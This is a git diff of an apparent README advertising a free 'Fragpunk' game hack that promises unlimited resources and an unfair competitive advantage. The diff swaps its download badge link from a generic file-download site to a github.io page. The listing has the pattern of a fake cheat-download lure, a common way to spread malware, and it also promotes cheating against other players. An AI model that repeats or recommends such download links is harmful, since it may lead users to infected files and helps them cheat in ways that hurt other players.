@@ -1,6 +1,6 @@
 Fragpunk Hack Free is a tool designed to unlock additional features and resources for the Fragpunk game, providing players with an unfair advantage in both casual and competitive gameplay. The hack allows for easy access to powerful in-game tools and resources without any cost, making it appealing to players who want to bypass the game's limitations. While these hacks might enhance the gaming experience, they come with risks and ethical concerns.
 
-[![Download Fragpunk Hack](https://img.shields.io/badge/Download-Fragpunk%20hack-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Fragpunk Hack](https://img.shields.io/badge/Download-Fragpunk%20hack-blueviolet)](https://fragpunk-hack-free.github.io/.github/)
 
 **Common Features of the Hack:**
 - **Unlimited Resources**: Gain unlimited in-game resources such as coins, items, and boosts without having to grind or spend money.
